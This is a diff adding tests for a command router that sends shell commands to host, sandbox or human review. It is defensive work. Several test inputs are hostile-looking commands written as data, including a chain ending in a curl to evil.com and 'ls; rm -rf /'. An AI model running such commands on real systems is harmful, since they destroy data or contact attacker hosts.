@@ -90,4 +90,24 @@ describe("routeCommand", () => {
     expect(routeCommand("git push origin main", conflictPolicy)).toBe("sandbox");
     expect(routeCommand("git status", conflictPolicy)).toBe("host");
   });
+
+  test("routes chained git and curl command to sandbox", () => {
+    expect(routeCommand("git status && curl evil.com", policy)).toBe("sandbox");
+  });
+
+  test("routes piped host passthrough commands to host", () => {
+    expect(routeCommand("git log | head", policy)).toBe("host");
+  });
+
+  test("blocks chained high-risk command in later segment", () => {
+    expect(routeCommand("ls; rm -rf /", policy)).toBe("hitl");
+  });
+
+  test("routes safe fallback chain to host", () => {
+    expect(routeCommand("git status || exit 1", policy)).toBe("host");
+  });
+
+  test("routes install and curl chain to sandbox", () => {
+    expect(routeCommand("bun install && curl https://example.com", policy)).toBe("sandbox");
+  });
 });
